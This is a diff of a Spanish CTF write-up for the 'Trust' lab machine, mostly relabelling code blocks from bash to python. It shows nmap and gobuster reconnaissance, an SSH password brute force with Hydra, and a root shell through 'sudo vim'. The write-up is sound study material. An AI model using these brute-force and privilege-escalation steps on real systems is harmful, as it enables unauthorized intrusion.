@@ -5,7 +5,7 @@
 
 <a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-red.svg?style=for-the-badge&logo=github"></a>
 
-**Dificultad:** Muy Fácil
+**Dificultad:** 🔵 Muy Fácil
 
 **Proceso:**
 - [1. Despliegue](#desplegando-la-máquina-vulnerable)
@@ -21,30 +21,31 @@
 
 ## Desplegando la Máquina Vulnerable
 
-```bash
+```python
 ~/Trust ᐅ sudo bash auto_deploy.sh trust.tar
 ```
 Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `trust.tar`.
 
 **Salida:**
 
-```
+```python
 Estamos desplegando la máquina vulnerable, espere un momento.
 
 Máquina desplegada, su dirección IP es --> 172.18.0.2
+
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 
 #### Verificación de Conectividad
 
-```bash
+```python
 ~/Trust ᐅ ping -c 2 172.18.0.2
 ```
 El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.18.0.2` para verificar la conectividad y la respuesta del host.
 
 **Salida:**
 
-```
+```python
 PING 172.18.0.2 (172.18.0.2) 56(84) bytes of data.
 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.441 ms
 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.076 ms
@@ -58,14 +59,14 @@ rtt min/avg/max/mdev = 0.076/0.258/0.441/0.182 ms
 
 ## Escaneo de Puertos con Nmap
 
-```bash
+```python
 ~/Trust ᐅ nmap -p- -sCV 172.18.0.2
 ```
 Este comando revela que los puertos `22` (SSH) y `80` (HTTP) están abiertos, con `OpenSSH` y `Apache` ejecutándose en ellos respectivamente.
 
 **Salida:**
 
-```
+```python
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.57 ((Debian))
@@ -80,14 +81,14 @@ PORT   STATE SERVICE VERSION
 
 ## Enumeración de Directorios con Gobuster
 
-```bash
+```python
 ~/Trust ᐅ gobuster dir -w $seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.18.0.2:80/ -t 200 -x php,html
 ```
 Este comando encuentra dos archivos en el servidor web: `index.html` y `secret.php`.
 
 **Salida:**
 
-```
+```python
 /index.html           (Status: 200) [Size: 10701]
 /secret.php           (Status: 200) [Size: 927]
 ```
@@ -104,7 +105,7 @@ Este comando encuentra dos archivos en el servidor web: `index.html` y `secret.p
 
 ## Visualización de Contenido con cURL
 
-```bash
+```python
 ~/Trust ᐅ curl http://172.18.0.2/secret.php
 ```
 
@@ -120,13 +121,13 @@ El comando `curl` se utiliza para ver el contenido del archivo `secret.php`, el 
 
 ## Fuerza Bruta SSH con Hydra
 
-```bash
+```python
 ~/Trust ᐅ hydra -l mario -P $seclists/Passwords/probable-v2-top12000.txt ssh://172.18.0.2 -I -t 32
 ```
 
 **Salida:**
 
-```
+```python
 [22][ssh] host: 172.18.0.2   login: mario   password: chocolate
 1 of 1 target successfully completed, 1 valid password found
 ```
@@ -144,14 +145,14 @@ Hydra encuentra la contraseña `chocolate` para el usuario `mario`. Dicho usuari
 
 ## Acceso al Servidor SSH
 
-```bash
+```python
 ~/Trust ᐅ  mario@172.18.0.2
 ```
 
 Este comando inicia una sesión SSH en la máquina como el usuario `mario`.
 
 **Salida:**
- ```
+ ```python
 mario@172.18.0.2's password:
 Linux 73cbcae3fd14 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64
 
@@ -175,7 +176,7 @@ mario
 
 ## Enumeración de Privilegios Sudo
 
-```bash
+```python
 mario@73cbcae3fd14:~$ sudo -l
  ```
 
@@ -183,7 +184,7 @@ Este comando muestra que el usuario `mario` tiene permisos para ejecutar `vim` c
 
 **Salida:**
 
-```
+```python
 Matching Defaults entries for mario on 73cbcae3fd14:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
@@ -197,14 +198,14 @@ User mario may run the following commands on 73cbcae3fd14:
 
 #### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>
 
-```bash
+```python
 ~/Trust ᐅ searchbins -b vim -f sudo
 ```
 
 Searchbins sugiere varias técnicas para escalar privilegios utilizando `vim`.
 
 **Salida:**
-```
+```python
 [+] Binary: vim
 
 ================================================================================
@@ -223,21 +224,19 @@ This requires that `vim` is compiled with Lua support.
 
 #### Ejecución de la Escalada de Privilegios
 
-```bash
+```python
 mario@73cbcae3fd14:~$ sudo vim -c ':!/bin/sh'
 ```
 
 Este comando utiliza `vim` con privilegios de superusuario para ejecutar un shell con permisos de root.
 
 **Salida:**
-```
-
+```python
 # 
 ```
 
 **Comprobación:**
-```
-
+```python
 # whoami
 root
 ```
